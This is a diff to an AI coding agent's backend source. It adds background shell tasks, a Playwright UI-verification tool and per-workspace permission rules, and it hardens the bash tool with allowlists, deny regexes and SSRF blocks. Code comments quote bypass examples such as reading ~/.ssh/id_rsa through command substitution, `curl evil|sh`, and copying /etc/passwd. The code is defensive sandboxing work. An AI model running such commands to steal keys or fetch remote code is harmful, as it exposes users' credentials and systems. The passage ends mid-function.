@@ -9,9 +9,39 @@
  *     model → tool calls → results → model …
  *   until the model replies with plain text (that text is the final answer).
  *
- * Tools: read_file, write_file, edit_file, bash, grep, glob, list_files,
- *        todo_write, list_memory_topics, read_memory_topic, load_skill,
- *        web_search, fetch_url, ask_user, spawn_agent
+ * Tools: read_file, write_file, edit_file, bash, bash_output, kill_shell,
+ *        grep, glob, list_files, todo_write, list_memory_topics,
+ *        read_memory_topic, load_skill, web_search, fetch_url, verify_ui,
+ *        ask_user, spawn_agent
+ *
+ * bash's baseline allowlist includes curl, but loopback-only by default
+ * (localhost/127.0.0.1) — enough to verify a server the agent just started
+ * (`curl http://localhost:PORT/api/...`) without opening general network
+ * egress; an external target needs the workspace to opt in via permissions,
+ * same mechanism as any other non-baseline command.
+ *
+ * verify_ui drives a REAL Playwright MCP server (services/mcpClient.mjs) —
+ * a separate child process, not in-process — through a batch of actions
+ * (click/fill/navigate/wait_for) and assertions (visible/text_contains/
+ * no_console_errors/no_network_errors), and returns one compact pass/fail
+ * result. Catches a component that typechecks but throws on render or shows
+ * a blank page, which validateSyntax (parse-only) can never catch. Opt-in:
+ * requires the workspace to declare mcpServers.playwright in
+ * .kodo/settings.json, same as everything else non-baseline here — no MCP
+ * infrastructure exists at all in the built-in tool set otherwise, matching
+ * how real Claude Code doesn't ship with Playwright MCP pre-attached either.
+ * Loopback-only by default. On a FAILURE with no console/network error to
+ * explain it, it takes a screenshot and — only if this user has a
+ * vision-capable model configured (services/modelRouter.mjs) — escalates to
+ * a one-off vision-model call for a compact visual diagnosis. No vision
+ * model configured → silently skipped, not an error.
+ *
+ * bash_output/kill_shell pair with bash's run_in_background:true — Claude
+ * Code-style background execution for anything that doesn't exit on its own
+ * (dev servers, watch mode). Without it the agent has no way to actually
+ * start a persistent process (a normal bash call would just hang until its
+ * timeout and get killed), so it would only ever describe the run command
+ * instead of running it.
  *
  * spawn_agent runs a nested, READ-ONLY agent loop (runSubAgent) with its own
  * context window and returns only a findings report — Claude Code-style task
@@ -23,7 +53,18 @@
  *   - SSE events the existing UI understands: progress, file_diff, plan_preview, todo, question
  *   - "ask" permission mode: pause for user approval before the FIRST mutation
  *   - "plan" permission mode: mutating tools disabled; the agent presents a plan
- *   - post-edit hooks from {workspace}/.kodo/hooks.json (e.g. prettier)
+ *   - {workspace}/.kodo/settings.json — same shape as Claude Code's own
+ *     settings.json, hooks and permissions side by side:
+ *       - hooks.postEdit (e.g. prettier, runs after every edit) and
+ *         hooks.stop (the project's own verify command — runs once before
+ *         the agent finishes and blocks completion on failure). Kodo never
+ *         guesses a project's toolchain itself.
+ *       - permissions.{allow,ask,deny}: Bash(<prefix>[:*]) rules, checked
+ *         deny > ask > allow > kodo's own built-in baseline allowlist. A
+ *         project can widen bash access (allow a binary kodo doesn't ship
+ *         by default), narrow it (deny one kodo would otherwise permit), or
+ *         require a per-command approval pause (ask) — configurable per
+ *         workspace instead of one fixed list for every user.
  *   - ask_user tool: the agent can pause and ask a clarifying question mid-task
  *     (not just approve/reject a plan) instead of guessing — mirrors Claude
  *     Code's own AskUserQuestion behavior. Answered via POST /answer/:requestId.
@@ -34,28 +75,59 @@ import fs from "fs/promises";
 import { spawn } from "child_process";
 import { fileURLToPath } from "url";
 import { AIMessage } from "@langchain/core/messages";
+import OpenAI from "openai";
 
 import { chatWithTools } from "../../services/agentChat.mjs";
 import { readMemoryTopic, listMemoryTopics, loadMemoryIndex } from "../../services/agentMemory.mjs";
 import { validateSyntax, writeFileAtomic } from "../../utils/syntax.util.mjs";
+import { isSensitiveFilePath } from "../../utils/path.util.mjs";
+import { sanitizedChildEnv } from "../../utils/process.util.mjs";
+import { spawnMcpServer } from "../../services/mcpClient.mjs";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 export const PROJECT_ROOT = path.resolve(__dirname, "..", "..", "..");
 const HISTORY_ROOT = path.resolve(PROJECT_ROOT, ".agent-history");
+// Kodo's OWN backend directory (one level up from PROJECT_ROOT) — where
+// @playwright/mcp actually lives. NOT the same as the target workspace a
+// verify_ui call operates on: the MCP server binary is installed as part of
+// kodo itself, so a relative path only resolves correctly against THIS
+// directory, never against an arbitrary project's cwd.
+const KODO_BACKEND_ROOT = path.resolve(__dirname, "..", "..");
+const PLAYWRIGHT_MCP_CLI = path.join(KODO_BACKEND_ROOT, "node_modules", "@playwright", "mcp", "cli.js");
 
-const MAX_ITERATIONS = 25;
+// A real multi-file build (several new components + wiring + verification)
+// can need more turns than a single-file fix — each turn's OUTPUT budget
+// limits how much large new-file content fits per turn (see maxTokens
+// below), so more files can genuinely mean more turns even with batched
+// reads. 25 was tuned for smaller tasks and was a real ceiling on larger
+// ones; raised with headroom. The wall-clock timeout in plannerAgent.mjs
+// (not this) is the outer bound that actually protects against runaway work.
+const MAX_ITERATIONS = 40;
 const MAX_FILE_BYTES = 120_000;
 const MAX_TOOL_OUTPUT_CHARS = 6_000;
-const MAX_CONV_MSGS = 48;
-const HUNK_MAX = 4_000;
+// A coordinated multi-file edit (e.g. 5-6 related React components) needs to
+// keep ALL of their read_file results genuinely visible at once — edit_file's
+// old_string must be copied verbatim from what the model can currently see.
+// Too tight a budget here evicts exactly that content mid-task: the model
+// then can't construct a valid edit for a file it "already read" (its content
+// was shrunk to a stub, or dropped into a name-only digest), so it re-reads
+// it — which can evict a DIFFERENT file it still needs, and so on. Observed
+// in practice as the agent stalling in a "read the same files again" loop on
+// a 6-component frontend build instead of ever finishing the edits. These
+// budgets were tuned defensively for weak/small-context providers but were
+// too tight for that shape of task; raised well above what six or so mid-size
+// component files need, while still bounded (not unlimited) for genuinely
+// small-context models.
+const MAX_CONV_MSGS = 80;
 // Character budget for the whole conversation. Several web/file fetches can
 // balloon the context past a model's input limit — the provider then returns a
 // hard error (e.g. gapgpt "400 Extra data") and the turn dies. Keeping the
-// conversation under a char budget (~1 token ≈ 4 chars, so ~13k tokens) avoids
-// that. On a size-related failure we shrink to the tighter budget and retry.
-const CONV_CHAR_BUDGET = 40_000;
-const CONV_CHAR_BUDGET_TIGHT = 22_000;
+// conversation under a char budget avoids that. On a size-related failure we
+// shrink to the tighter budget and retry.
+const HUNK_MAX = 4_000;
+const CONV_CHAR_BUDGET = 100_000;
+const CONV_CHAR_BUDGET_TIGHT = 50_000;
 
 function conversationChars(conv) {
   let n = 0;
@@ -97,6 +169,7 @@ async function synthesizeFromGathered({ creds, conversation, cleanMessage, onChu
     temperature: 0.2,
     signal: abortSignal || undefined,
     onChunk,
+    thinking: false, // synthesizing from already-gathered findings, not reasoning from scratch
   });
   return String(message?.content || "").trim();
 }
@@ -104,8 +177,10 @@ async function synthesizeFromGathered({ creds, conversation, cleanMessage, onChu
 // Shrink the OLDEST tool outputs (fetched pages, file reads) to a short stub
 // until the conversation fits the budget — without removing any messages, so
 // assistant/tool_call pairing stays intact (removing a tool result would break
-// the API contract). The most recent `keepRecent` messages are left untouched.
-function shrinkOldToolOutputs(conversation, budget, keepRecent = 6) {
+// the API contract). The most recent `keepRecent` messages are left untouched
+// — kept generous so a multi-file task's still-relevant read_file results
+// (needed verbatim for edit_file's old_string) aren't the first thing shrunk.
+export function shrinkOldToolOutputs(conversation, budget, keepRecent = 14) {
   let total = conversationChars(conversation);
   if (total <= budget) return;
   const limit = conversation.length - keepRecent;
@@ -211,29 +286,222 @@ const BASH_ALLOWED_CMDS = new Set([
   "ls", "cat", "grep", "rg", "find", "mkdir", "touch", "mv", "cp", "rm",
   "echo", "wc", "head", "tail", "sed", "awk", "sort", "uniq", "diff",
   "pwd", "which", "stat", "du", "tree", "cd", "true", "test",
+  "curl", // loopback-only by default — see the curl-target check below
 ]);
+
+// curl is the odd one out on the baseline list above: every other command
+// there is either read-only or confined to the workspace by the path checks
+// already in validateBashCommand, but curl can reach anywhere on the
+// network. The actual need it exists for is narrow — verifying a dev
+// server/API the agent itself just started with run_in_background — so by
+// default it's restricted to loopback only. Mirrors fetch_url's SSRF block
+// (below) in reverse: that tool exists to browse the public web and refuses
+// loopback; this one exists to check localhost and refuses everything else,
+// unless a workspace's .kodo/settings.json permissions widens it (same
+// allow/ask opt-in mechanism as any other non-baseline command).
+function isLoopbackHost(hostname) {
+  const h = String(hostname || "").toLowerCase().replace(/^\[|\]$/g, "");
+  if (h === "localhost" || h.endsWith(".localhost") || h === "::1") return true;
+  return /^127\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(h);
+}
+
+function findUrlTokens(seg) {
+  return seg.match(/https?:\/\/[^\s'"]+/gi) || [];
+}
 
 const BASH_DENY_RE = /\b(sudo|shutdown|reboot|halt|poweroff|mkfs|chown|chmod\s+777\s+\/|launchctl|systemctl)\b|rm\s+(-[a-zA-Z]*\s+)*(\/|~)(\s|$)|>\s*\/dev\/(sd|disk)|curl[^|;&]*\|\s*(ba|z)?sh|wget[^|;&]*\|\s*(ba|z)?sh|:\s*\(\)\s*\{/;
 
-export function validateBashCommand(command) {
+// Shell metacharacters that smuggle a SECOND command past the first-token
+// allowlist below. Command substitution `$(…)` / backticks and process
+// substitution `<(…)`/`>(…)` run their contents as arbitrary commands, and a
+// newline starts an unchecked new line. Without this, `echo $(cat ~/.ssh/id_rsa)`
+// or `ls \`curl evil|sh\`` sail straight through — the outer token is allowlisted
+// while the inner command runs unchecked. (Test-confirmed bypass before this.)
+const SHELL_SUBSTITUTION_RE = /\$\(|`|<\(|>\(|[\r\n]/;
+
+// Interpreters on the allowlist that will execute an arbitrary program passed
+// inline (node -e/-p, python3 -c). We keep the binaries — real dev work needs
+// `npm`/`node <file>` — but reject the inline-eval flags that turn them into a
+// raw code-execution primitive equivalent to an un-allowlisted shell.
+const INLINE_EVAL_RE = {
+  node: /(^|\s)(-e|--eval|-p|--print)(\s|=|$)/,
+  python3: /(^|\s)-c(\s|$)/,
+  python: /(^|\s)-c(\s|$)/,
+};
+
+// `find`/`awk` sub-features that execute arbitrary commands or delete files.
+const EXEC_FEATURE_RE = /\bfind\b[^|;&]*\s-(execdir|exec|delete)\b|\bawk\b[^|;&]*\bsystem\s*\(/;
+
+// Absolute /dev sinks that are safe as redirect/argument targets.
+const ALLOWED_ABS = new Set(["/dev/null", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/tty"]);
+
+// A single shell token escapes the workspace if it names an absolute path, a
+// home path (`~`), or climbs out with `..`. This is what actually confines the
+// bash tool to the workspace — `cat ~/.ssh/id_rsa`, `echo x >> ~/.zshrc`,
+// `cp /etc/passwd .`, `find /Users -delete` all die here regardless of which
+// allowlisted command fronts them. Leading redirection operators are stripped
+// first so `>~/.zshrc` and `2>/etc/x` are caught too.
+function tokenEscapesWorkspace(rawTok) {
+  let t = String(rawTok || "").trim();
+  if (!t) return false;
+  t = t.replace(/^['"]+/, "").replace(/^\d*[<>]{1,2}&?/, "").replace(/^['"]+/, "").replace(/['"]+$/, "");
+  if (!t || t === "&") return false;
+  if (ALLOWED_ABS.has(t)) return false;
+  if (t.startsWith("~")) return true;
+  if (t.startsWith("/")) return true;
+  if (t === ".." || t.startsWith("../") || t.includes("/../") || t.endsWith("/..")) return true;
+  return false;
+}
+
+// ── Permission rules (Claude Code-style: deny > ask > allow > default) ───────
+// kodo's own BASH_ALLOWED_CMDS above is a fixed baseline for every workspace —
+// useful, but not the way Claude Code actually governs tool access: there,
+// each project declares its own allow/ask/deny rules and the model works
+// within whatever the project grants, rather than a single list hardcoded for
+// everyone. Mirrored here via {workspace}/.kodo/settings.json:
+//   { "permissions": { "allow": ["Bash(git push:*)"], "ask": ["Bash(npm publish:*)"], "deny": ["Bash(docker:*)"] } }
+// Rule syntax: "Bash(<prefix>)", optionally ending ":*" for a prefix match
+// (matches "git push" and anything after it); without ":*" it must match a
+// segment exactly. Matching is PER SEGMENT (each ;/&&/|/&-separated piece of
+// a chained command) rather than the raw whole string — matching the whole
+// string would let `git status | rm -rf /` ride in on a "Bash(git status:*)"
+// allow rule just because the string starts with it.
+function parseBashRule(rule) {
+  const m = /^Bash\((.*)\)$/.exec(String(rule || "").trim());
+  if (!m) return null;
+  const body = m[1].trim();
+  if (!body) return null;
+  return body.endsWith(":*") ? { prefix: body.slice(0, -2).trim(), exact: false } : { prefix: body, exact: true };
+}
+
+function matchesBashRule(segment, rule) {
+  const parsed = parseBashRule(rule);
+  if (!parsed || !parsed.prefix) return false;
+  const seg = String(segment || "").trim();
+  return parsed.exact ? seg === parsed.prefix : (seg === parsed.prefix || seg.startsWith(parsed.prefix + " "));
+}
+
+function splitBashSegments(cmd) {
+  // A single `&` is a separator too, so a backgrounded second command
+  // doesn't ride along unchecked.
+  return String(cmd || "").split(/(?:\|\||&&|;|\||&)/).map((s) => s.trim()).filter(Boolean);
+}
+
+// True if this command needs a per-command approval pause before running,
+// i.e. some segment matches an "ask" rule and no more specific "allow" rule
+// also covers it. Called AFTER validateBashCommand has already confirmed the
+// command is structurally safe.
+export function bashApprovalNeeded(cmd, permissions) {
+  const { allow = [], ask = [] } = permissions || {};
+  if (!ask.length) return false;
+  for (const seg of splitBashSegments(cmd)) {
+    if (ask.some((r) => matchesBashRule(seg, r)) && !allow.some((r) => matchesBashRule(seg, r))) return true;
+  }
+  return false;
+}
+
+// A heredoc marker, or a newline combined with an output redirect, is
+// virtually always an attempt to write FILE CONTENT via bash (`cat <<EOF >
+// file`, `echo "..." > file`) instead of using write_file/edit_file. That's
+// always the wrong tool for it — bash is capped at 2000 chars total (so it
+// silently fails on anything but a tiny file), skips syntax validation and
+// undo snapshots, and shows no diff in the UI. Caught here, ahead of the
+// generic newline block below, so the redirect to the right tool is
+// immediate instead of discovered after several confused workaround attempts
+// (heredoc → "too long" → node -e → give up).
+const HEREDOC_WRITE_ATTEMPT_RE = /<<[-~]?\s*['"]?\w/;
+
+export function validateBashCommand(command, permissions = {}) {
   const cmd = String(command || "").trim();
   if (!cmd) return "command is required";
+  // Checked BEFORE the length cap below: a real heredoc/file-write attempt is
+  // almost always well over 2000 chars (that's the whole reason it's a
+  // heredoc), so if the length check ran first it would eat every realistic
+  // case and this message — the one actually telling the model what to do
+  // instead — would never be seen. That was a real bug: the model kept
+  // reporting "the heredoc is too long" verbatim, because that (unhelpful,
+  // generic) message was the only one it was ever actually getting.
+  if (HEREDOC_WRITE_ATTEMPT_RE.test(cmd) || (/[\r\n]/.test(cmd) && />\s*\S/.test(cmd))) {
+    return "command blocked: writing file content via bash (heredoc, `cat <<EOF > file`, `echo ... > file`) is never the right tool for it. Use write_file to create a new file, or edit_file to modify an existing one — they handle newlines/quotes/large content correctly and produce a real diff. If the content is too large for one write_file call, write a smaller version first and extend it with edit_file, or split it across several edit_file calls — don't try to route around it through bash.";
+  }
   if (cmd.length > 2000) return "command too long";
+  if (SHELL_SUBSTITUTION_RE.test(cmd)) return "command blocked: command/process substitution, backticks and newlines are not allowed (they bypass the command allowlist)";
   if (BASH_DENY_RE.test(cmd)) return "command blocked by safety policy (destructive or privileged operation)";
+  if (EXEC_FEATURE_RE.test(cmd)) return "command blocked: find -exec/-delete and awk system() can run arbitrary code";
 
-  // Check the first token of every pipeline/sequence segment against the allowlist.
-  const segments = cmd.split(/(?:\|\||&&|;|\|)/).map((s) => s.trim()).filter(Boolean);
+  // Per-token checks, BEFORE the allowlist: (1) refuse any path that escapes the
+  // workspace (absolute, ~, ..) — the real confinement boundary; (2) refuse any
+  // token that names a secret/credential file, so `cat .env`, `cp id_rsa …`, and
+  // redirects into a key file are all blocked just like the read/write tools.
+  // Neither of these is overridable by a permission rule — they're about
+  // whether the string is safe to hand to a shell at all, not a risk-tolerance
+  // policy a project gets to opt out of.
+  for (const rawTok of cmd.split(/\s+/)) {
+    if (tokenEscapesWorkspace(rawTok)) {
+      return `command blocked: "${rawTok}" references a path outside the workspace (absolute, ~ or ..). The agent may only touch files inside the workspace.`;
+    }
+    const cleanTok = rawTok.replace(/^['"]+/, "").replace(/^\d*[<>]{1,2}&?/, "").replace(/['"]+$/, "");
+    if (cleanTok && isSensitiveFilePath(cleanTok)) {
+      return `command blocked: "${rawTok}" targets a secret/credential file. The agent may not read or write secrets.`;
+    }
+  }
+
+  const { allow = [], ask = [], deny = [] } = permissions || {};
+  const segments = splitBashSegments(cmd);
   for (const seg of segments) {
     const first = seg.replace(/^[({\s]+/, "").split(/\s+/)[0];
     if (!first) continue;
     const base = path.basename(first);
     if (first.startsWith("$") || first.startsWith("VAR=")) continue; // env prefix — check next token is too strict; allow
-    if (!BASH_ALLOWED_CMDS.has(base)) {
-      return `command "${base}" is not in the allowed list (${[...BASH_ALLOWED_CMDS].slice(0, 12).join(", ")}, …)`;
+
+    // A workspace's own deny rule always wins, even over kodo's built-in
+    // baseline allowlist below — same precedence as Claude Code permissions.
+    if (deny.some((r) => matchesBashRule(seg, r))) {
+      return `command blocked by this workspace's permission rules (.kodo/settings.json "deny"): "${seg.slice(0, 100)}"`;
     }
-    // rm may only touch relative paths inside the workspace
-    if (base === "rm" && /(^|\s)(\/|~)/.test(seg.slice(2))) {
-      return "rm may only be used with relative paths inside the workspace";
+
+    if (!BASH_ALLOWED_CMDS.has(base)) {
+      // Outside kodo's baseline, a workspace can still explicitly opt in via
+      // .kodo/settings.json permissions.allow/ask — configurable per-project
+      // access, not a single fixed list for every user. "ask" is enough to
+      // pass this structural check; the approval pause itself happens at the
+      // executor (bashApprovalNeeded), once we know this isn't otherwise blocked.
+      const opted = allow.some((r) => matchesBashRule(seg, r)) || ask.some((r) => matchesBashRule(seg, r));
+      if (!opted) {
+        return `command "${base}" is not in the allowed list (${[...BASH_ALLOWED_CMDS].slice(0, 12).join(", ")}, …) — a workspace admin can grant it via .kodo/settings.json, e.g. {"permissions":{"allow":["Bash(${base}:*)"]}}`;
+      }
+    }
+    // Interpreters may not eval an inline program (that is arbitrary code
+    // exec) — unconditional, not something any permission rule can unlock,
+    // since it would bypass every other check below (workspace confinement,
+    // secret-file blocking) at once.
+    if (INLINE_EVAL_RE[base]?.test(seg)) {
+      return `command blocked: "${base}" inline-eval flags (-e/-c/-p) run arbitrary code. Write a file and run it instead.`;
+    }
+    if (base === "curl") {
+      const urlTokens = findUrlTokens(seg);
+      if (!urlTokens.length) {
+        return `command blocked: curl needs an explicit http:// or https:// URL — the target has to be checkable.`;
+      }
+      for (const raw of urlTokens) {
+        let host;
+        try { host = new URL(raw).hostname; } catch { return `command blocked: curl target "${raw}" isn't a valid URL.`; }
+        if (!isLoopbackHost(host)) {
+          const widened = allow.some((r) => matchesBashRule(seg, r)) || ask.some((r) => matchesBashRule(seg, r));
+          if (!widened) {
+            return `command blocked: curl is allowed by default only against this project's own local server (localhost/127.0.0.1) — "${host}" is an external target. A workspace admin can widen this via .kodo/settings.json, e.g. {"permissions":{"allow":["Bash(curl:*)"]}}.`;
+          }
+        }
+      }
+    }
+    // rm may only touch relative paths inside the workspace, and never the
+    // workspace root itself (`.`, `./`, `*`) recursively — also unconditional.
+    if (base === "rm") {
+      const rest = seg.slice(seg.indexOf("rm") + 2);
+      if (/(^|\s)(\/|~)/.test(rest)) return "rm may only be used with relative paths inside the workspace";
+      if (/-[a-z]*r/i.test(rest) && /(^|\s)(\.|\.\/|\*)(\s|$)/.test(rest)) {
+        return "recursive rm of the whole workspace (., ./, *) is blocked";
+      }
     }
   }
   return null;
@@ -250,13 +518,18 @@ function resolveShell() {
   return { bin: process.env.SHELL || "/bin/bash", flag: "-c" };
 }
 
+// Child processes must not inherit the server's secrets. An allowlisted `npm`
+// script / postinstall hook / `env`-reading tool would otherwise see
+// OPENAI_API_KEY and every other credential in process.env and could exfiltrate
+// it. Strip anything that looks like a secret; keep PATH/HOME/SHELL so tooling
+// still works.
 function runBash(command, cwd, timeoutMs = 120_000) {
   return new Promise((resolve) => {
     const { bin, flag } = resolveShell();
     const child = spawn(bin, [flag, command], {
       cwd,
       stdio: ["ignore", "pipe", "pipe"],
-      env: { ...process.env, CI: "1", FORCE_COLOR: "0" },
+      env: sanitizedChildEnv(),
     });
 
     let stdout = "";
@@ -283,6 +556,95 @@ function runBash(command, cwd, timeoutMs = 120_000) {
       resolve({ exit_code: null, stdout, stderr: `${stderr}\n${err.message}`.trim() });
     });
   });
+}
+
+// ── Background bash tasks (Claude Code-style run_in_background) ──────────────
+// runBash above is fully synchronous — it only resolves when the child exits
+// or the timeout kills it. A dev server / watch task never exits, so any
+// attempt to start one this way just hangs the tool call for minutes and then
+// gets killed with nothing useful to show — which is exactly why the agent
+// would never actually start one itself and would just tell the user to run
+// the command. This mirrors Claude Code's real mechanism instead: bash gets a
+// `run_in_background` option that spawns detached and returns immediately
+// with a task id; `bash_output` polls that task's accumulated output/status;
+// `kill_shell` stops it (e.g. before restarting the same server on a
+// different port). Tasks live for the life of the server process — an
+// in-memory registry is enough for a dev tool, no persistence needed.
+
+const BACKGROUND_TASKS = new Map(); // task_id -> { id, command, cwd, child, startedAt, outputFile, status, exitCode }
+const MAX_TRACKED_TASKS = 20;
+let _taskCounter = 0;
+
+function nextTaskId() {
+  _taskCounter++;
+  return `bg_${Date.now().toString(36)}_${_taskCounter}`;
+}
+
+// Bound the registry: once it's full, evict the oldest EXITED task (never a
+// still-running one) to make room. A long-lived server process would
+// otherwise accumulate an unbounded number of dead entries.
+function pruneBackgroundTasks() {
+  if (BACKGROUND_TASKS.size < MAX_TRACKED_TASKS) return;
+  for (const [id, task] of BACKGROUND_TASKS) {
+    if (task.status === "exited") { BACKGROUND_TASKS.delete(id); return; }
+  }
+}
+
+async function runBashBackground(command, root, cwd) {
+  const tasksDir = path.join(root, ".kodo", "tasks");
+  await fs.mkdir(tasksDir, { recursive: true });
+  const id = nextTaskId();
+  const outputFile = path.join(tasksDir, `${id}.output`);
+  await fs.writeFile(outputFile, "");
+
+  const { bin, flag } = resolveShell();
+  const child = spawn(bin, [flag, command], {
+    cwd,
+    stdio: ["ignore", "pipe", "pipe"],
+    env: sanitizedChildEnv(),
+    detached: process.platform !== "win32", // own process group, so kill_shell can stop the whole tree (e.g. npm + the vite it spawns)
+  });
+  child.unref();
+
+  const appendOutput = (buf) => { fs.appendFile(outputFile, buf.toString()).catch(() => {}); };
+  child.stdout.on("data", appendOutput);
+  child.stderr.on("data", appendOutput);
+
+  pruneBackgroundTasks();
+  const task = { id, command, cwd, child, startedAt: Date.now(), outputFile, status: "running", exitCode: null };
+  child.on("close", (code) => { task.status = "exited"; task.exitCode = code; });
+  child.on("error", (err) => { task.status = "exited"; appendOutput(`\n[process error: ${err.message}]\n`); });
+  BACKGROUND_TASKS.set(id, task);
+
+  return { id, outputFile: path.relative(root, outputFile) };
+}
+
+function killBackgroundTask(id) {
+  const task = BACKGROUND_TASKS.get(id);
+  if (!task) return { success: false, error: `No background task "${id}" — check the id, or it may have already exited and been cleaned up.` };
+  if (task.status === "exited") return { success: true, message: `Task ${id} (${task.command.slice(0, 80)}) had already exited (exit code ${task.exitCode}).` };
+  try {
+    if (process.platform === "win32") task.child.kill();
+    else process.kill(-task.child.pid, "SIGTERM"); // negative pid: whole process group
+  } catch {
+    try { task.child.kill("SIGTERM"); } catch { /* already gone */ }
+  }
+  return { success: true, message: `Sent a stop signal to task ${id} (${task.command.slice(0, 80)}).` };
+}
+
+async function readBackgroundTaskOutput(id) {
+  const task = BACKGROUND_TASKS.get(id);
+  if (!task) return { success: false, error: `No background task "${id}" — check the id, or it may have already exited and been cleaned up.` };
+  let output = "";
+  try { output = await fs.readFile(task.outputFile, "utf-8"); } catch { /* not written yet */ }
+  return {
+    success: true,
+    task_id: id,
+    command: task.command,
+    status: task.status,
+    exit_code: task.exitCode,
+    output: output.slice(-MAX_TOOL_OUTPUT_CHARS),
+  };
 }
 
 // ── grep (ripgrep-backed, grep fallback) ─────────────────────────────────────
@@ -411,10 +773,31 @@ function extractDesignSignals(html) {
   };
 }
 
+// Block SSRF to loopback / private / link-local hosts. Without this the agent
+// could be steered into fetching internal services (its own API on :9000, other
+// localhost apps) or the cloud metadata endpoint (169.254.169.254) that hands
+// out credentials. Not a defence against DNS-rebinding, but it stops the direct
+// cases. (Applies to fetch_url; web_search is pinned to duckduckgo.)
+function isBlockedFetchHost(hostname) {
+  const h = String(hostname || "").toLowerCase().replace(/^\[|\]$/g, "");
+  if (!h) return true;
+  if (h === "localhost" || h.endsWith(".localhost") || h.endsWith(".local") || h === "::1" || h === "0.0.0.0") return true;
+  const m = h.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
+  if (m) {
+    const a = Number(m[1]), b = Number(m[2]);
+    if (a === 127 || a === 10 || a === 0) return true;                 // loopback / private / this-network
+    if (a === 169 && b === 254) return true;                          // link-local + cloud metadata
+    if (a === 172 && b >= 16 && b <= 31) return true;                 // private
+    if (a === 192 && b === 168) return true;                          // private
+  }
+  return false;
+}
+
 export async function fetchUrl(rawUrl) {
   let url;
   try { url = new URL(String(rawUrl).trim()); } catch { return { success: false, error: `Invalid URL: ${rawUrl}` }; }
   if (!/^https?:$/.test(url.protocol)) return { success: false, error: "Only http/https URLs are allowed" };
+  if (isBlockedFetchHost(url.hostname)) return { success: false, error: "Blocked: refusing to fetch a loopback/private/link-local address." };
   try {
     const res = await fetch(url, {
       signal: AbortSignal.timeout(WEB_TIMEOUT_MS),
@@ -432,6 +815,194 @@ export async function fetchUrl(rawUrl) {
   } catch (err) {
     return { success: false, error: `Fetch failed for ${url.href}: ${String(err?.message || err).slice(0, 120)}` };
   }
+}
+
+// Real runtime/visual verification for UI work: a component can typecheck
+// and lint clean while still throwing on render, showing a blank page, or
+// crashing in the browser — validateSyntax only proves the TEXT parses, it
+// never executes anything. Driven through a real Playwright MCP server (a
+// separate child process, not in-process — see services/mcpClient.mjs) so a
+// crashed/hung browser can't take the main backend process down with it.
+// Loopback-only by default for the same reason curl is above: the real use
+// case is checking a dev server the agent itself just started.
+//
+// verify_ui is ONE compound tool rather than exposing the raw MCP tool
+// surface (browser_click, browser_navigate, ...) directly to the model: the
+// model hands it a batch of actions + assertions, and everything in between
+// (running the batch, collecting console/network signals, evaluating
+// assertions, deciding pass/fail, and optionally escalating to a vision
+// model on an unexplained failure) happens in one tool call instead of many
+// round-trips through the main loop.
+
+async function runMcpAction(client, action) {
+  const type = String(action?.type || "").toLowerCase();
+  switch (type) {
+    case "navigate":
+      return client.callTool("browser_navigate", { url: action.url || action.text || "" });
+    case "click":
+      return client.callTool("browser_click", { target: action.selector || "", element: action.selector || "element" });
+    case "fill":
+      return client.callTool("browser_type", { target: action.selector || "", text: action.text ?? "", element: action.selector || "element", submit: !!action.submit });
+    case "wait_for":
+      return client.callTool("browser_wait_for", { time: action.seconds, text: action.text, textGone: action.text_gone });
+    default:
+      throw new Error(`Unknown action type "${action?.type}" — expected one of: navigate, click, fill, wait_for.`);
+  }
+}
+
+async function runAssertion(client, assertion, signals) {
+  const type = String(assertion?.type || "").toLowerCase();
+  if (type === "no_console_errors") {
+    return { ...assertion, pass: signals.consoleErrorCount === 0, detail: `${signals.consoleErrorCount} console error(s)` };
+  }
+  if (type === "no_network_errors") {
+    return { ...assertion, pass: signals.networkErrorCount === 0, detail: `${signals.networkErrorCount} failed (4xx/5xx) network request(s)` };
+  }
+  if (type === "visible" || type === "text_contains") {
+    const fn = type === "visible"
+      ? `() => { const el = document.querySelector(${JSON.stringify(assertion.selector || "")}); return !!el && !!(el.offsetWidth || el.offsetHeight || (el.getClientRects && el.getClientRects().length)); }`
+      : `() => document.body.innerText.includes(${JSON.stringify(assertion.text || "")})`;
+    try {
+      const res = await client.callTool("browser_evaluate", { function: fn });
+      const trimmed = res.text.trim();
+      const pass = /true/i.test(trimmed) && !/false/i.test(trimmed);
+      return { ...assertion, pass, detail: trimmed.slice(0, 200) };
+    } catch (err) {
+      return { ...assertion, pass: false, detail: `evaluate failed: ${String(err?.message || err).slice(0, 150)}` };
+    }
+  }
+  return { ...assertion, pass: false, detail: `Unknown assertion type "${assertion?.type}" — expected one of: visible, text_contains, no_console_errors, no_network_errors.` };
+}
+
+// One-off vision-model call, deliberately NOT going through chatWithTools
+// (agentChat.mjs's multimodal content handling isn't verified for both
+// provider paths — see resolveVisionCreds above). OpenAI-compatible only for
+// v1 (covers openai/gapgpt/qwen-vl/local vision models); an Anthropic vision
+// route is skipped rather than sent malformed content.
+async function analyzeScreenshotWithVision(visionCreds, { imagePath, promptContext }) {
+  if (!visionCreds || visionCreds.provider === "anthropic") return null;
+  try {
+    const buffer = await fs.readFile(imagePath);
+    const dataUrl = `data:image/png;base64,${buffer.toString("base64")}`;
+    const client = new OpenAI({ apiKey: visionCreds.apiKey, baseURL: visionCreds.baseURL, timeout: 30_000, maxRetries: 1 });
+    const response = await client.chat.completions.create({
+      model: visionCreds.model,
+      temperature: 0.1,
+      max_tokens: 300,
+      messages: [
+        { role: "system", content: "You are helping a coding agent debug a UI. Given a screenshot and the checks that failed, describe concisely and concretely what's visually wrong (layout, missing elements, broken styling, error text shown, etc). Be specific and brief." },
+        { role: "user", content: [
+          { type: "text", text: promptContext },
+          { type: "image_url", image_url: { url: dataUrl } },
+        ] },
+      ],
+    });
+    return response.choices?.[0]?.message?.content?.trim() || null;
+  } catch (err) {
+    console.warn("[verify_ui] vision escalation failed:", String(err?.message || err).slice(0, 200));
+    return null; // never fail the whole verify_ui call because vision escalation failed
+  }
+}
+
+export async function verifyUi(args, ctx) {
+  const { root, mcpServers, mcpClients, visionCreds } = ctx;
+  let url;
+  try { url = new URL(String(args?.url || "").trim()); } catch { return { success: false, error: `Invalid URL: ${args?.url}` }; }
+  if (!/^https?:$/.test(url.protocol)) return { success: false, error: "Only http/https URLs are allowed" };
+  if (!isLoopbackHost(url.hostname)) {
